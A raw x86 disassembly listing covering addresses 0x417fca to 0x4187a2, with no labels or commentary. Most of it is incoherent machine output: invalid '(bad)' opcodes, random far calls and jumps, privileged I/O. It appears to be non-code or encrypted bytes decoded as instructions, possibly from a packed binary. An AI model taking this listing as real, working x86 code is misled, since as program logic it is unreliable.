  417fca:	mov    DWORD PTR [ebx+0x36903d7],edi
  417fd0:	cdq    
  417fd1:	aad    0xa5
  417fd3:	(bad)  
  417fd4:	adc    al,0xcb
  417fd6:	nop
  417fd7:	jae    0x417f61
  417fd9:	jno    0x417fb2
  417fdb:	jnp    0x417fa7
  417fdd:	bound  edi,QWORD PTR [edi*1-0x743966d8]
  417fe4:	mov    ch,0x31
  417fe6:	sbb    edx,DWORD PTR [eax+0x4e]
  417fe9:	in     eax,dx
  417fea:	sub    BYTE PTR [edx],al
  417fec:	mov    al,ds:0x495851ea
  417ff1:	pop    edx
  417ff2:	loopne 0x418025
  417ff4:	adc    al,0xa5
  417ff6:	mov    esi,esp
  417ff8:	icebp  
  417ff9:	sbb    ah,bh
  417ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ffc:	gs cmp bl,cl
  417fff:	xchg   edx,eax
  418000:	sub    DWORD PTR [esi+0x41ab1f2],edx
  418006:	ret    
  418007:	cs xchg edi,eax
  418009:	test   al,0x55
  41800b:	xor    BYTE PTR [edi+eax*4-0x6b3247a2],ah
  418012:	push   edi
  418013:	mov    WORD PTR [edi+0x78],fs
  418016:	jl     0x417fd5
  418018:	mov    dh,0x33
  41801a:	sbb    BYTE PTR [ecx+ebx*2+0x38],dh
  41801e:	dec    ebx
  41801f:	dec    edx
  418020:	pop    esi
  418021:	iret   
  418022:	cmp    eax,0xec822ebc
  418027:	hlt    
  418028:	push   es
  418029:	inc    edx
  41802a:	fiadd  WORD PTR [edx-0x45]
  41802d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41802e:	mov    edi,0x905f4513
  418033:	pop    ecx
  418034:	xchg   edx,eax
  418035:	ds dec edx
  418037:	lahf   
  418038:	in     al,dx
  418039:	fwait
  41803a:	scas   al,BYTE PTR es:[edi]
  41803b:	xchg   ebx,eax
  41803c:	cld    
  41803d:	mov    al,ds:0x56d4e30a
  418042:	mov    ecx,0xd6fbfa2d
  418047:	sbb    eax,0x611e01f9
  41804c:	and    BYTE PTR [edx],0x6a
  41804f:	and    ebx,DWORD PTR [ecx-0x5f]
  418052:	int    0xaf
  418054:	jb     0x417ffa
  418056:	sub    edi,DWORD PTR [eax]
  418058:	faddp  st(3),st
  41805a:	popf   
  41805b:	in     eax,dx
  41805c:	outs   dx,BYTE PTR ds:[esi]
  41805d:	imul   eax,DWORD PTR [esp+ecx*8-0x619728f8],0x123db21d
  418068:	retf   
  418069:	ins    DWORD PTR es:[edi],dx
  41806a:	js     0x41808c
  41806c:	xchg   ecx,eax
  41806d:	scas   eax,DWORD PTR es:[edi]
  41806e:	aas    
  41806f:	enter  0x62bb,0x37
  418073:	(bad)  
  418074:	ins    BYTE PTR es:[edi],dx
  418075:	out    dx,al
  418076:	fidiv  DWORD PTR [ecx-0x4bdbc71f]
  41807c:	add    al,0xfd
  41807e:	bound  ebp,QWORD PTR [ecx]
  418080:	cmp    BYTE PTR [esi],cl
  418082:	mov    esi,edx
  418084:	and    ebp,ebp
  418086:	ffreep st(2)
  418088:	test   DWORD PTR [esi+esi*2],ebp
  41808b:	test   ebx,eax
  41808d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41808e:	ins    BYTE PTR es:[edi],dx
  41808f:	mov    edi,0x5a7075c7
  418094:	add    eax,0x8ab2e8c9
  418099:	cmp    BYTE PTR [edx-0x10],dh
  41809c:	xor    DWORD PTR [ebx],ecx
  41809e:	xlat   BYTE PTR ds:[ebx]
  41809f:	jo     0x4180b9
  4180a1:	push   esp
  4180a2:	pushf  
  4180a3:	push   eax
  4180a4:	inc    eax
  4180a5:	(bad)  
  4180a6:	in     eax,dx
  4180a7:	pop    ebx
  4180a8:	imul   edi,DWORD PTR [ecx-0x76],0x70
  4180ac:	inc    esi
  4180ad:	xchg   ecx,eax
  4180ae:	cmp    BYTE PTR [eax-0x387632f1],0x77
  4180b5:	mov    eax,0xdc5336e7
  4180ba:	scas   al,BYTE PTR es:[edi]
  4180bb:	xchg   edx,eax
  4180bc:	mov    ah,0x13
  4180be:	enter  0x51aa,0x2
  4180c2:	inc    ecx
  4180c3:	push   es
  4180c4:	jecxz  0x418047
  4180c6:	sti    
  4180c7:	jle    0x4180fd
  4180c9:	retf   0x15c4
  4180cc:	iret   
  4180cd:	xor    ah,BYTE PTR ds:0x89346a67
  4180d3:	nop
  4180d4:	icebp  
  4180d5:	xor    BYTE PTR [ecx],bl
  4180d7:	mov    esi,0x6b4bb9f7
  4180dc:	sar    BYTE PTR [edi+ebp*8+0x6b],0x40
  4180e1:	push   esi
  4180e2:	push   ecx
  4180e3:	push   ebp
  4180e4:	adc    DWORD PTR [esp+edx*4],ecx
  4180e7:	dec    esp
  4180e8:	sar    BYTE PTR [esi+0x4],1
  4180eb:	mov    ecx,0x65a368e3
  4180f0:	and    dl,BYTE PTR [ebx+0xa]
  4180f3:	mov    bh,0xfe
  4180f5:	jae    0x418158
  4180f7:	sbb    edi,DWORD PTR [ebx+0x213517b3]
  4180fd:	imul   eax,DWORD PTR [edx+0x6e],0x23
  418101:	loop   0x41808a
  418103:	xchg   esi,eax
  418104:	popf   
  418105:	call   0x9c75:0xf5eb9451
  41810c:	call   0x24b:0xd6d91a2e
  418113:	dec    cx
  418115:	dec    esi
  418116:	data16 (bad) 
  418119:	dec    ebx
  41811a:	push   esi
  41811b:	iret   
  41811c:	mov    ds:0x95aebb1,al
  418121:	and    DWORD PTR [eax],edi
  418123:	or     ch,ah
  418125:	add    cl,BYTE PTR [edi]
  418127:	push   0xffffffae
  418129:	mov    esi,es
  41812b:	(bad)  
  41812c:	fsub   st(0),st
  41812e:	(bad)  
  41812f:	and    BYTE PTR [edi+0x13],dh
  418132:	mov    esp,0xe1011b7a
  418137:	push   edx
  418138:	mov    edi,0xb3d6c4c7
  41813d:	pop    esp
  41813e:	push   eax
  41813f:	dec    esi
  418140:	aam    0x38
  418142:	int    0x19
  418144:	ins    DWORD PTR es:[edi],dx
  418145:	xchg   DWORD PTR [esi-0x79],eax
  418148:	imul   edx
  41814a:	addr16 and al,0x8e
  41814d:	fldenv [esi-0x1b612f64]
  418153:	and    al,0x91
  418155:	xor    al,0x5a
  418157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418158:	je     0x4180f4
  41815a:	repz xchg esp,eax
  41815c:	xchg   edi,eax
  41815d:	cmp    al,0xe9
  41815f:	pop    esi
  418160:	dec    esp
  418161:	xlat   BYTE PTR ds:[ebx]
  418162:	js     0x418192
  418164:	fwait
  418165:	push   eax
  418166:	sbb    DWORD PTR [ebp-0xba601c2],edi
  41816c:	sub    al,0x7
  41816e:	pusha  
  41816f:	xor    BYTE PTR [ebx+0x5b892b9c],0xce
  418176:	and    eax,0xe6115d93
  41817b:	pushf  
  41817c:	enter  0xbe74,0xf9
  418180:	mov    ah,0x84
  418182:	pop    edi
  418183:	call   0x941e:0x91198be9
  41818a:	es pop edx
  41818c:	mov    cl,0xf9
  41818e:	push   edi
  41818f:	cmp    BYTE PTR [esi],dh
  418191:	xor    BYTE PTR [ebx-0x74b48acc],ch
  418197:	jne    0x4181a5
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	push   ebp
  4181b8:	cli    
  4181b9:	push   0xffffffd8
  4181bb:	sbb    DWORD PTR [edi+edi*2],esi
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x418234
  4181c4:	sti    
  4181c5:	in     al,dx
  4181c6:	mov    ebp,0xf858ee99
  4181cb:	adc    BYTE PTR ds:0x41ac21d1,dl
  4181d1:	jne    0x4181f7
  4181d3:	and    eax,0xfa269eb3
  4181d8:	pusha  
  4181d9:	jno    0x418171
  4181db:	(bad)  
  4181dc:	jp     0x4181be
  4181de:	retf   
  4181df:	push   cs
  4181e0:	out    dx,al
  4181e1:	pop    eax
  4181e2:	lea    edi,[ecx-0x6b5c48ac]
  4181e8:	mov    al,ds:0x827c8576
  4181ed:	jle    0x418261
  4181ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f0:	mov    dh,al
  4181f2:	ins    DWORD PTR es:[edi],dx
  4181f3:	sub    BYTE PTR [ecx],dh
  4181f5:	popf   
  4181f6:	call   0x64acfb36
  4181fb:	retf   0x6c67
  4181fe:	sub    esp,DWORD PTR [ebx+0x17]
  418201:	sbb    eax,0x157a84c7
  418206:	aaa    
  418207:	cmp    bh,BYTE PTR [ecx+esi*2+0x35]
  41820b:	in     eax,0x71
  41820d:	xor    eax,0xb3211aaa
  418212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418213:	mov    eax,ds:0x20f72a9a
  418218:	cmp    eax,0x2e2444f7
  41821d:	fsubrp st(1),st
  41821f:	xlat   BYTE PTR ds:[ebx]
  418220:	clc    
  418221:	sbb    DWORD PTR [edi-0x50],ebx
  418224:	lea    edx,[esi-0x650c64a5]
  41822a:	adc    ecx,DWORD PTR [ebp+0x15717c72]
  418230:	mov    bl,0xe3
  418232:	imul   edi,DWORD PTR [ebx-0x19],0x32f3e74
  418239:	mov    dl,0xcd
  41823b:	mov    dl,0x91
  41823d:	sub    BYTE PTR [ebx-0x13abde58],0x76
  418244:	add    BYTE PTR [edx],dl
  418246:	call   0x22a6:0xeb9ac2cf
  41824d:	and    eax,0xc7958362
  418252:	or     BYTE PTR [edi],dh
  418254:	popf   
  418255:	sbb    BYTE PTR [ebx-0x4a2c3f98],bh
  41825b:	mov    edi,0x82abc055
  418260:	out    dx,eax
  418261:	pop    ss
  418262:	mov    dl,0x5f
  418264:	xor    al,0x84
  418266:	(bad)  
  418267:	jne    0x4182be
  418269:	mov    bh,0xb1
  41826b:	xchg   ebp,eax
  41826c:	push   ebx
  41826d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41826e:	(bad)  
  41826f:	mov    ecx,0x8bdf402d
  418274:	outs   dx,BYTE PTR ds:[esi]
  418275:	(bad)  
  418276:	scas   al,BYTE PTR es:[edi]
  418277:	shl    eax,cl
  418279:	or     DWORD PTR [ebp-0xe],esi
  41827c:	mov    dl,0x60
  41827e:	jns    0x418226
  418280:	loop   0x418275
  418282:	arpl   WORD PTR [esi],si
  418284:	(bad)  
  418285:	xor    eax,0x94bca865
  41828a:	adc    bl,BYTE PTR [ecx-0x731860c]
  418290:	imul   DWORD PTR [esi-0x3c]
  418293:	pop    eax
  418294:	outs   dx,DWORD PTR ds:[esi]
  418295:	inc    eax
  418296:	dec    ebx
  418297:	nop
  418298:	stos   BYTE PTR es:[edi],al
  418299:	jb     0x41828c
  41829b:	add    eax,0xf4638f18
  4182a0:	inc    ebx
  4182a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182a2:	jmp    0xfc0f96bb
  4182a7:	jb     0x4182fb
  4182a9:	push   ebx
  4182aa:	fistp  QWORD PTR [ebx+0x2b]
  4182ad:	scas   eax,DWORD PTR es:[edi]
  4182ae:	(bad)  
  4182af:	pop    ebp
  4182b0:	int    0xb5
  4182b2:	outs   dx,BYTE PTR ds:[esi]
  4182b3:	call   0xeca3f81d
  4182b8:	ds nop
  4182ba:	jmp    0x7e5ff60c
  4182bf:	fistp  WORD PTR [ecx+0x608c0f6c]
  4182c5:	shl    eax,0xa1
  4182c8:	fwait
  4182c9:	cmp    BYTE PTR ds:0x3068647d,ch
  4182cf:	and    ecx,DWORD PTR [edx+0x3d]
  4182d2:	inc    ebx
  4182d3:	mov    ebx,0xddd016f3
  4182d8:	push   ebp
  4182d9:	popf   
  4182da:	iret   
  4182db:	sbb    DWORD PTR [esi-0x17],eax
  4182de:	js     0x418326
  4182e0:	in     eax,0x42
  4182e2:	inc    esi
  4182e3:	je     0x4182dc
  4182e5:	shl    BYTE PTR [eax],1
  4182e7:	xor    DWORD PTR [edi],ebx
  4182e9:	test   DWORD PTR [esi+0x15],ebx
  4182ec:	sub    esp,edx
  4182ee:	mov    ebx,0xe0de26e
  4182f3:	sub    DWORD PTR [edi+0x46ef3211],edx
  4182f9:	mov    cl,0x1f
  4182fb:	jecxz  0x418345
  4182fd:	or     ebx,DWORD PTR [edx-0x7ba5c0cd]
  418303:	fs or  edx,edi
  418306:	idiv   BYTE PTR [esi+0x3e]
  418309:	stc    
  41830a:	mov    cs,WORD PTR [eax]
  41830c:	cmc    
  41830d:	test   al,0x3b
  41830f:	imul   edi,eax,0xffffffda
  418312:	jne    0x41832e
  418314:	inc    ecx
  418315:	es fst st(0)
  418318:	add    BYTE PTR [ebx],dh
  41831a:	mov    ecx,0xaf79fa25
  41831f:	dec    edi
  418320:	pop    es
  418321:	add    DWORD PTR [eax+0x25],edi
  418324:	sub    eax,0x94cb0e8e
  418329:	mov    esp,0x95c9113e
  41832e:	jecxz  0x418328
  418330:	sar    BYTE PTR [ebx],0x48
  418333:	stc    
  418334:	popf   
  418335:	sahf   
  418336:	xchg   ebp,eax
  418337:	shl    DWORD PTR [eax+0x1a],cl
  41833a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41833b:	jb     0x418359
  41833d:	std    
  41833e:	je     0x41831f
  418340:	enter  0xe059,0xa1
  418344:	xchg   ebx,eax
  418345:	or     cl,BYTE PTR [ebx+0x35369bdc]
  41834b:	inc    DWORD PTR [edi+0x6c]
  41834e:	cmp    DWORD PTR [ecx-0x69],edx
  418351:	xchg   edi,eax
  418352:	mov    eax,0x75580acb
  418357:	pop    esp
  418358:	test   cl,cl
  41835a:	ret    0x583
  41835d:	adc    ecx,DWORD PTR [edi+0x31a03ffd]
  418363:	push   ebx
  418364:	arpl   dx,sp
  418366:	(bad)  
  418367:	pop    edi
  418368:	and    cl,BYTE PTR ds:[edx-0x4e]
  41836c:	jecxz  0x418375
  41836e:	xchg   esi,eax
  41836f:	or     al,0x39
  418371:	adc    eax,0x734aa71
  418376:	cmp    DWORD PTR [edx],0xffffffe7
  418379:	(bad)  
  41837a:	push   0x30
  41837c:	or     bl,dh
  41837e:	xchg   esi,eax
  41837f:	jbe    0x4183ab
  418381:	add    DWORD PTR ds:0xc8f6c5ec,esp
  418387:	call   0x107d:0x3cd4e8be
  41838e:	dec    ecx
  41838f:	mov    ds:0xf9c7fc9,eax
  418394:	js     0x4183df
  418396:	and    ah,bl
  418398:	shl    edi,0x6c
  41839b:	lock cmp eax,0xd1e57ef1
  4183a1:	xchg   ecx,eax
  4183a2:	cmc    
  4183a3:	inc    ebx
  4183a4:	push   eax
  4183a5:	(bad)  
  4183a6:	in     eax,0x9e
  4183a8:	fldcw  WORD PTR [edx+0x6ac3f1e8]
  4183ae:	sub    DWORD PTR [ecx+0x53013ff9],0x3
  4183b5:	retf   
  4183b6:	loope  0x418338
  4183b8:	xchg   edi,eax
  4183b9:	adc    dl,cl
  4183bb:	mov    al,0x6d
  4183bd:	cmp    edi,ecx
  4183bf:	jmp    0x2efbed34
  4183c4:	or     BYTE PTR [ebx+0x29311de2],bl
  4183ca:	lock jnp 0x41834e
  4183cd:	push   ss
  4183ce:	daa    
  4183cf:	jb     0x418426
  4183d1:	push   edx
  4183d2:	icebp  
  4183d3:	push   0xdcd2ebd8
  4183d8:	push   ebx
  4183d9:	adc    esp,DWORD PTR [ebx+0x61581af7]
  4183df:	cld    
  4183e0:	lock ss cs push ebx
  4183e4:	xchg   BYTE PTR [esi],cl
  4183e6:	mov    ebp,0xfb33fbe0
  4183eb:	jmp    0xb089:0xca1cf04f
  4183f2:	popf   
  4183f3:	mov    ?,WORD PTR [edi+0x37]
  4183f6:	retf   0x29ff
  4183f9:	cmp    eax,0x2c07abd8
  4183fe:	jg     0x418449
  418400:	(bad)  
  418401:	aad    0x1f
  418403:	mov    ?,ebx
  418405:	fldenv [edi]
  418407:	stc    
  418408:	outs   dx,DWORD PTR ds:[esi]
  418409:	(bad)  
  41840a:	jmp    0x41843c
  41840c:	inc    ecx
  41840d:	loopne 0x4183fc
  41840f:	(bad)  
  418412:	mov    cs,edx
  418414:	adc    ch,ch
  418416:	push   edi
  418417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418418:	adc    eax,0xe1bd1592
  41841d:	mov    ah,0x76
  41841f:	pop    ebp
  418420:	add    al,0xe9
  418422:	mov    ebx,0x2eb74a9d
  418427:	jnp    0x418433
  418429:	adc    edi,DWORD PTR [ebx]
  41842b:	adc    BYTE PTR [eax-0x33],0x29
  41842f:	outs   dx,BYTE PTR ds:[esi]
  418430:	lds    ebp,FWORD PTR [ecx-0x42]
  418433:	push   cs
  418434:	ins    DWORD PTR es:[edi],dx
  418435:	mov    eax,ds:0x2ae6703b
  41843a:	test   eax,0xa8553df
  41843f:	loope  0x41842e
  418441:	jg     0x4183f2
  418443:	push   ss
  418444:	or     BYTE PTR [ecx-0x7b],ah
  418447:	or     eax,0xff43370c
  41844c:	pop    esi
  41844d:	pop    ecx
  41844e:	sbb    ecx,edx
  418450:	pusha  
  418451:	push   ebx
  418452:	mov    eax,0xbbe795c
  418457:	ins    DWORD PTR es:[edi],dx
  418458:	sbb    edi,edi
  41845a:	mov    edi,0x9a139eb7
  41845f:	lods   eax,DWORD PTR ds:[esi]
  418460:	inc    edx
  418461:	out    0xec,al
  418463:	jg     0x418437
  418465:	loopne 0x418407
  418467:	pusha  
  418468:	push   ebx
  418469:	retf   
  41846a:	cdq    
  41846b:	mov    edx,0x4131e2c2
  418470:	mov    cl,0x6a
  418472:	cmp    eax,0x965c58ad
  418477:	add    bh,BYTE PTR [edi+edi*2]
  41847a:	mov    esi,DWORD PTR [edx-0x6f8d4cf0]
  418480:	leave  
  418481:	les    edx,FWORD PTR [edi+0x67f0fae4]
  418487:	inc    esi
  418488:	pusha  
  418489:	call   0x6c264d17
  41848e:	xor    eax,0x88ae7a11
  418493:	stos   DWORD PTR es:[edi],eax
  418494:	pusha  
  418495:	push   0x3e0994f3
  41849a:	(bad)  
  41849b:	xlat   BYTE PTR ds:[ebx]
  41849c:	add    BYTE PTR [ebx-0x65],dh
  41849f:	addr16 dec ecx
  4184a1:	push   ebx
  4184a2:	sbb    al,0xd4
  4184a4:	out    0xa6,eax
  4184a6:	mov    al,0x9d
  4184a8:	lahf   
  4184a9:	call   0xc26a:0x8c43ddc1
  4184b0:	test   al,0x59
  4184b2:	push   ebp
  4184b3:	xor    al,0xa0
  4184b5:	neg    dl
  4184b7:	into   
  4184b8:	sub    edi,ebp
  4184ba:	aas    
  4184bb:	and    ecx,0x811c1032
  4184c1:	stc    
  4184c2:	sub    BYTE PTR [ebp-0x7af00764],al
  4184c8:	inc    esi
  4184c9:	stc    
  4184ca:	(bad)  
  4184cb:	(bad)  
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0x14ec6d48
  4184e3:	push   eax
  4184e4:	(bad)  
  4184e5:	adc    al,0x14
  4184e7:	cmp    DWORD PTR [edi+0x78],edi
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	add    BYTE PTR [eax-0x4f],dh
  4184f1:	js     0x418527
  4184f3:	sbb    DWORD PTR [esi],0xd5cd7930
  4184f9:	fxch   st(6)
  4184fb:	pushf  
  4184fc:	push   eax
  4184fd:	in     al,0x74
  4184ff:	add    DWORD PTR [esi-0x62],esi
  418502:	test   bl,ah
  418504:	popf   
  418505:	out    0x35,al
  418507:	sbb    cl,BYTE PTR [esi+0x5]
  41850a:	dec    ecx
  41850b:	xrelease mov DWORD PTR [esi-0x1d615b8b],esi
  418512:	fldenv [ebx+0x58]
  418515:	pop    eax
  418516:	dec    eax
  418517:	jno    0x418570
  418519:	lahf   
  41851a:	cdq    
  41851b:	jmp    0x33b:0x19dfdc83
  418522:	(bad)  
  418523:	cmp    BYTE PTR [edi-0x5b41a138],bl
  418529:	mov    edx,0xa9eded02
  41852e:	(bad)  
  41852f:	lock or dl,BYTE PTR [edi-0x54]
  418533:	rcr    DWORD PTR [ebx-0x26],1
  418536:	inc    ebp
  418537:	adc    eax,0xc8a1005e
  41853c:	pop    esp
  41853d:	test   al,0xb2
  41853f:	lea    esp,[edx+0x44]
  418542:	sub    eax,0x31c189ba
  418547:	fld    DWORD PTR [edx]
  418549:	mov    ds:0xa2a49a06,al
  41854e:	add    dh,BYTE PTR [edi]
  418550:	ret    0x3bed
  418553:	das    
  418554:	xor    al,bh
  418556:	ins    BYTE PTR es:[edi],dx
  418557:	dec    edx
  418558:	dec    edx
  418559:	jb     0x4185a9
  41855b:	ins    DWORD PTR es:[edi],dx
  41855c:	and    eax,0x233616a8
  418561:	jmp    0xcd3b:0x1cc84618
  418568:	scas   eax,DWORD PTR es:[edi]
  418569:	lea    eax,[edi-0x35]
  41856c:	test   al,0xff
  41856e:	mov    ss,WORD PTR [esi]
  418570:	ja     0x418599
  418572:	lea    eax,[ebx]
  418574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418575:	jae    0x41854c
  418577:	sub    edi,edi
  418579:	adc    DWORD PTR [esi],0x3d
  41857c:	shl    DWORD PTR [edi],0x16
  41857f:	mov    ebp,ss
  418581:	ja     0x41850d
  418583:	inc    esp
  418584:	dec    ebp
  418585:	loope  0x4185c6
  418587:	xchg   esp,eax
  418588:	outs   dx,DWORD PTR ds:[esi]
  418589:	jnp    0x418599
  41858b:	jno    0x4185f4
  41858d:	push   cs
  41858e:	add    edi,DWORD PTR [edi]
  418590:	aaa    
  418591:	mov    edi,0x67010850
  418596:	sub    eax,0x59387f72
  41859b:	std    
  41859c:	sti    
  41859d:	add    BYTE PTR [esi+0xb970b95],bh
  4185a3:	pop    ds
  4185a4:	jmp    0x41852e
  4185a6:	mov    al,0xec
  4185a8:	retf   0xdcb5
  4185ab:	outs   dx,BYTE PTR ds:[esi]
  4185ac:	xchg   esi,eax
  4185ad:	sar    ebp,1
  4185af:	lock jecxz 0x41856d
  4185b2:	xor    BYTE PTR [esi+0x27],ah
  4185b5:	sahf   
  4185b6:	mov    dl,0x9
  4185b8:	sub    eax,0xa1df49dc
  4185bd:	aas    
  4185be:	hlt    
  4185bf:	push   ebp
  4185c0:	mov    dh,0xce
  4185c2:	retf   0xfa1b
  4185c5:	mov    ds:0xb15ee16f,al
  4185ca:	ins    BYTE PTR es:[edi],dx
  4185cb:	add    BYTE PTR [ecx-0x2c],bh
  4185ce:	pop    edx
  4185cf:	pop    ebp
  4185d0:	or     cl,BYTE PTR [edi-0x5c]
  4185d3:	aaa    
  4185d4:	mov    al,ds:0x6f6eab7f
  4185d9:	pop    ds
  4185da:	aam    0x41
  4185dc:	inc    esi
  4185dd:	aam    0x86
  4185df:	pop    ds
  4185e0:	dec    esp
  4185e1:	mov    bh,0x84
  4185e3:	imul   ecx,DWORD PTR [ecx-0x4dc67e4b],0x41
  4185ea:	pushf  
  4185eb:	dec    esp
  4185ec:	fstp   TBYTE PTR [ebx+edx*8-0x2c]
  4185f0:	imul   esp,esi,0x3b
  4185f3:	or     DWORD PTR [edi+0x30a84c99],ecx
  4185f9:	out    0x5a,al
  4185fb:	xor    ebp,DWORD PTR [ecx]
  4185fd:	int3   
  4185fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185ff:	sar    BYTE PTR gs:[eax-0x27e1f436],cl
  418606:	dec    eax
  418607:	push   ds
  418608:	fsub   DWORD PTR [edx-0x52]
  41860b:	xlat   BYTE PTR ds:[ebx]
  41860c:	inc    ecx
  41860d:	inc    eax
  41860e:	jecxz  0x4185b4
  418610:	jns    0x4185b1
  418612:	ja     0x4185fa
  418614:	pop    edx
  418615:	push   ds
  418616:	pop    ebp
  418617:	fs push ds
  418619:	enter  0x43eb,0x3d
  41861d:	sbb    eax,0x4d2c6088
  418622:	popf   
  418623:	mov    dh,0x1b
  418625:	jbe    0x4185ae
  418627:	add    eax,0xe32dd58e
  41862c:	jp     0x418698
  41862e:	xor    edi,DWORD PTR [eax-0x69]
  418631:	push   edx
  418632:	std    
  418633:	cmp    bh,BYTE PTR [ecx+0x5b]
  418636:	push   ss
  418637:	stos   DWORD PTR es:[edi],eax
  418638:	mov    edx,0x1e4139b3
  41863d:	or     eax,0xcbf26d18
  418642:	(bad)  
  418643:	mov    bl,0x1d
  418645:	cli    
  418646:	mov    ecx,0xf603bc17
  41864b:	mov    dl,0x4f
  41864d:	adc    ecx,DWORD PTR [eax]
  41864f:	push   cs
  418650:	das    
  418651:	aas    
  418652:	mov    ds:0xa07c1eb7,eax
  418657:	xchg   ecx,eax
  418658:	adc    ebx,ebp
  41865a:	loope  0x418607
  41865c:	sti    
  41865d:	daa    
  41865e:	rcl    BYTE PTR [ecx+0x566e0c61],1
  418664:	push   edi
  418665:	sbb    al,0xe0
  418667:	mov    ds:0xae7c27e1,eax
  41866c:	push   esi
  41866d:	ret    
  41866e:	or     DWORD PTR [ecx-0x1a],ecx
  418671:	xchg   edi,eax
  418672:	pop    ds
  418673:	ret    
  418674:	out    dx,al
  418675:	(bad)  
  418676:	adc    BYTE PTR [ecx],bh
  418678:	sub    bh,al
  41867a:	push   0x12
  41867c:	ins    DWORD PTR es:[edi],dx
  41867d:	push   ss
  41867e:	lahf   
  41867f:	(bad)  
  418680:	jl     0x4186c5
  418682:	mov    al,0x94
  418684:	sub    al,0x68
  418686:	rcr    dh,cl
  418688:	inc    ecx
  418689:	sbb    DWORD PTR [ebx+0x33d009ce],esp
  41868f:	or     dl,BYTE PTR [esi]
  418691:	mov    DWORD PTR [ebx-0x6fa8c911],esi
  418697:	xor    eax,0x2b0856a8
  41869c:	cmp    al,bl
  41869e:	and    ch,dh
  4186a0:	xchg   edi,eax
  4186a1:	out    dx,eax
  4186a2:	test   al,0xdd
  4186a4:	jno    0x41865b
  4186a6:	shl    ecx,cl
  4186a8:	sub    ebp,DWORD PTR [ebp+esi*4-0x71]
  4186ac:	xor    al,0xad
  4186ae:	div    DWORD PTR [ecx+0x29]
  4186b1:	popf   
  4186b2:	outs   dx,DWORD PTR ds:[esi]
  4186b3:	scas   al,BYTE PTR es:[edi]
  4186b4:	mov    edi,0xcd968682
  4186b9:	push   0xffffffe3
  4186bb:	dec    ebx
  4186bc:	add    al,0xda
  4186be:	push   0x77f6af1f
  4186c3:	push   0xdb1ba577
  4186c8:	add    DWORD PTR [esp+ecx*8],0xffffffcb
  4186cc:	fistp  DWORD PTR [edi+ecx*4-0x778233c1]
  4186d3:	mov    dh,0x44
  4186d5:	or     DWORD PTR [edx-0x49],ebp
  4186d8:	add    al,0x94
  4186da:	mov    BYTE PTR [edx-0x690bc8ae],bh
  4186e0:	(bad)  
  4186e1:	out    dx,eax
  4186e2:	loopne 0x41872d
  4186e4:	rcr    ebp,0xc2
  4186e7:	out    dx,eax
  4186e8:	ret    
  4186e9:	sbb    dh,al
  4186eb:	or     ah,al
  4186ed:	or     DWORD PTR [eax-0x5055f7c1],edi
  4186f3:	push   ecx
  4186f4:	dec    ebx
  4186f5:	imul   eax,edx,0x91a58e26
  4186fb:	out    dx,eax
  4186fc:	femms  
  4186fe:	mov    ebx,0xc79272b5
  418703:	xlat   BYTE PTR ds:[ebx]
  418704:	mov    eax,0xc72c71a
  418709:	retf   0xa31f
  41870c:	(bad)  
  41870d:	loopne 0x4186ba
  41870f:	js     0x41878a
  418711:	(bad)  
  418712:	add    BYTE PTR [ebx-0x3d5e91b6],0x13
  418719:	sub    eax,0xd4fda42
  41871e:	outs   dx,BYTE PTR ds:[esi]
  41871f:	and    DWORD PTR [ebx+0x3c240a10],esp
  418725:	mov    ecx,0x43d8023f
  41872a:	(bad)  
  41872b:	loop   0x41879f
  41872d:	mov    ch,0x23
  41872f:	dec    eax
  418730:	jnp    0x418750
  418732:	out    dx,eax
  418733:	xchg   esi,eax
  418734:	cdq    
  418735:	out    0xa2,eax
  418737:	sbb    cl,bh
  418739:	mov    edx,0x3642eae1
  41873e:	add    edi,DWORD PTR [edx+edx*8-0xc]
  418742:	iret   
  418743:	hlt    
  418744:	mov    bh,0x21
  418746:	out    dx,al
  418747:	ja     0x4186fa
  418749:	mov    al,ds:0xb23e5e75
  41874e:	test   BYTE PTR [edx-0x37bb88f],ch
  418754:	(bad)  
  418756:	ins    BYTE PTR es:[edi],dx
  418757:	je     0x41873d
  418759:	mov    BYTE PTR [esi],al
  41875b:	mov    dh,0x74
  41875d:	pusha  
  41875e:	mov    esi,0xe36af2ae
  418763:	jmp    0x418744
  418765:	add    al,BYTE PTR [edx]
  418767:	mov    esi,es
  418769:	stos   DWORD PTR es:[edi],eax
  41876a:	inc    edi
  41876b:	xor    BYTE PTR [edx-0x2c],al
  41876e:	add    eax,esi
  418770:	lods   al,BYTE PTR ds:[esi]
  418771:	jbe    0x4186f6
  418773:	jge    0x41874d
  418775:	aaa    
  418776:	lea    edi,[esi-0x2dbf7b14]
  41877c:	sar    BYTE PTR [ebp+0x40661f14],0x52
  418783:	cmp    bl,bh
  418785:	dec    ecx
  418787:	add    esi,DWORD PTR [eax]
  418789:	push   esi
  41878a:	aam    0x82
  41878c:	add    eax,0xa119dcbb
  418791:	add    dh,BYTE PTR [edi]
  418793:	push   0x57bc906
  418798:	fbstp  TBYTE PTR [esi+0x57e902fd]
  41879e:	xchg   DWORD PTR [edx],ebx
  4187a0:	mov    al,0x52
  4187a2:	jns    0x418811
